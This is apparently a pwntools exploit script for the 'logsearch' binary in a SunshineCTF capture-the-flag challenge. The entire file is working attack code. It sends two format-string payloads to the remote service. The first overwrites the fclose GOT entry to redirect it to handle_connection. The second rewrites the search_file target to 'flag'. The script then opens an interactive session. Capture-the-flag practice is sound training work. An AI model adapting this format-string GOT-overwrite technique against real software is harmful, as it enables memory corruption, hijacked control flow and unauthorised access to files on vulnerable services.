from pwn import *

exe = ELF("logsearch")
context(binary=exe)

# r = exe.process()
# gdb.attach(r, "c")
r = remote("chal1.sunshinectf.org", 20008)

fmt_writes = {
	exe.got["fclose"]: exe.symbols["handle_connection"]
}

fmt = fmtstr.fmtstr_payload(
	offset=87,
	writes=fmt_writes,
	numbwritten=0,
	write_size="short")

payload = str(fmt)

info("Payload 1: %r" % payload)

r.recvuntil("Enter a search phrase: ")
r.sendline(payload)

fmt_writes = {
	exe.symbols["search_file"]: u32("flag")
}

fmt = fmtstr.fmtstr_payload(
	offset=87,
	writes=fmt_writes,
	numbwritten=0,
	write_size="short")

payload = str(fmt)

info("Payload 2: %r" % payload)

r.recvuntil("Enter a search phrase: ")
r.sendline(payload)

r.recvuntil("Enter a search phrase: ")
r.sendline("sun")

r.interactive()
